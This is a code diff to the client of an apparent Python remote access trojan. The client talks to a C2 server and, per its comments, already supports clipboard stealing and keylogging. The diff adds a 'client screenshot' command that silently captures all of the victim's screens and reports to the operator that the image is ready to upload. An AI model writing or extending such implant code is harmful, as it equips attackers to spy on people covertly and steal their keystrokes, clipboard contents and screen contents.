@@ -16,8 +16,10 @@ from time import time, sleep
 from subprocess import run, PIPE, STDOUT
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from pyperclip import paste, PyperclipWindowsException
-from pynput.keyboard import Key, Listener, Controller
+from pynput.keyboard import Listener, Controller
+from PIL import ImageGrab
 from encryption import cipher
+
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
                       C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND, ZIP_PASSWORD, INCOMING)
@@ -83,11 +85,14 @@ clientPrint = client.split("@")[0:1]
 
 # the delay between re-connection attempts when inactive is set in settings.py
 delay = DELAY
+
 # Initialize that support background jobs like Clipboard stealing, Key logging and screenshots
 clipCount = 0
 listener = None
 keyLog = []
 
+# This variable used to unique screenshots names
+shoutCount = 0
 
 # Better use infinity loop when add control active sessions feature in Server Side
 while True:
@@ -370,6 +375,19 @@ while True:
             post_to_server("You must enter some text to type on the client. \n")
         except keyboard.InvalidCharacterException:
             post_to_server("A not-typeable Characters was Encountered. \n")
+
+    # the 'client screenshot' command allows us to grab a copy from the client's screen
+    elif command == "client screenshot":
+        # Use to be screenshot names is to be unique
+        shoutCount += 1
+
+        # Take a screenshot and save it
+        screenshot = ImageGrab.grab(all_screens=True)
+        screenshot.save(f"screenshot_{shoutCount}.png")
+
+        # Notify us on server to screenshot saved
+        post_to_server(f"screenshot_{shoutCount}.png has been Saved on the Client. "
+                       f"\nuse client upload screenshot_{shoutCount}.png to get it. \n")
 
     # Else, the wrong input, actually not a Built-in Command or Shell Command or Client/Server Commands
     else:
